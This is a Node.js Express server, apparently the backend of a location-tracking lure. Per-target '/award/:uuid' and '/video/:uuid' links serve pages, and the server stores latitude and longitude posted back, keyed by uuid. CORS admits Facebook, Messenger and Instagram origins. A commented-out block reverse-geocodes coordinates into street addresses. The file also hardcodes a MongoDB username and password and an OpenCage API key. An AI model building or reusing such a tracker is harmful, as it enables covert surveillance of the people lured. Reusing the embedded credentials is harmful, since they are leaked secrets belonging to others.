// const express = require('express');
// const mongoose = require('mongoose');
// const bodyParser = require('body-parser');
// const cors = require('cors');
// const path = require('path');

// const app = express();
// app.use(bodyParser.json());

// app.use(cors({
//     origin: ['https://video-i.vercel.app'],
//     methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
// }));

// const mongoURI = "mongodb+srv://heshimajulienofficial:gZo66bAOKJBetFSQ@localisation.st4rgvh.mongodb.net/?retryWrites=true&w=majority&appName=localisation";
// const port = process.env.PORT || 3000;

// mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
//     .then(() => console.log('DB connected successfully'))
//     .catch(err => console.error('DB connection error:', err));

// const locationSchema = new mongoose.Schema({
//     uuid: String,
//     latitude: Number,
//     longitude: Number,
//     timestamp: { type: Date, default: Date.now }
// });

// const Location = mongoose.model('Location', locationSchema);

// app.use(express.static(path.join(__dirname, 'public')));

// app.get('/video/:uuid', (req, res) => {
//     res.sendFile(path.join(__dirname, 'public', 'track.html'));
// });

// app.post('/location', async (req, res) => {
//     const { uuid, latitude, longitude } = req.body;
//     console.log('Received data:', req.body); // Log the received data

//     const newLocation = new Location({ uuid, latitude, longitude });

//     try {
//         await newLocation.save();
//         res.status(200).send('Location saved');
//     } catch (err) {
//         console.error('Error saving location:', err); // Log the error
//         res.status(500).send('Error saving location');
//     }
// });

// app.listen(port, () => {
//     console.log(`Server is running on port ${port}`);
// });




// const axios = require('axios');

// const API_KEY = '0d91477bf1894b3f9ba9d868227882c1'; // Remplacez par votre clé API
// const latitude = -1.6479235;
// const longitude = 29.1799175;

// const getGeolocationInfo = async (lat, lon) => {
//     const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${API_KEY}`;
    
//     try {
//         const response = await axios.get(url);
//         const results = response.data.results;
//         if (results.length > 0) {
//             const address = results[0].formatted;
//             const components = results[0].components; // Pour détails plus fins comme les adresses de rue
//             return {
//                 address,
//                 components
//             };
//         } else {
//             return 'No results found';
//         }
//     } catch (error) {
//         console.error('Error fetching geolocation data:', error);
//         return 'Error fetching geolocation data';
//     }
// };

// getGeolocationInfo(latitude, longitude).then(data => {
//     console.log('Address:', data.address);
//     console.log('Components:', data.components);
// });





const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(bodyParser.json());

const allowedOrigins = [
    'https://video-i.vercel.app',
    'mercury-award.vercel.app',
    'https://www.facebook.com',
    'https://www.messenger.com',
    'https://m.me',
    'https://www.instagram.com'
];

app.use(cors({
    origin: function (origin, callback) {
        if (!origin) return callback(null, true);
        if (allowedOrigins.indexOf(origin) === -1) {
            const msg = 'The CORS policy for this site does not allow access from the specified origin.';
            return callback(new Error(msg), false);
        }
        return callback(null, true);
    },
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
}));

const mongoURI = "mongodb+srv://heshimajulienofficial:gZo66bAOKJBetFSQ@localisation.st4rgvh.mongodb.net/?retryWrites=true&w=majority&appName=localisation";
const port = process.env.PORT || 3000;

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('DB connected successfully'))
    .catch(err => console.error('DB connection error:', err));

const locationSchema = new mongoose.Schema({
    uuid: String,
    latitude: Number,
    longitude: Number,
    timestamp: { type: Date, default: Date.now }
});

const Location = mongoose.model('Location', locationSchema);

app.use(express.static(path.join(__dirname, 'public')));

app.get('/award/:uuid', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'award.html'));
});

app.post('/location', async (req, res) => {
    const { uuid, latitude, longitude } = req.body;
    console.log('Received data:', req.body);

    const newLocation = new Location({ uuid, latitude, longitude });

    try {
        await newLocation.save();
        res.status(200).send('Location saved');
    } catch (err) {
        console.error('Error saving location:', err);
        res.status(500).send('Error saving location');
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

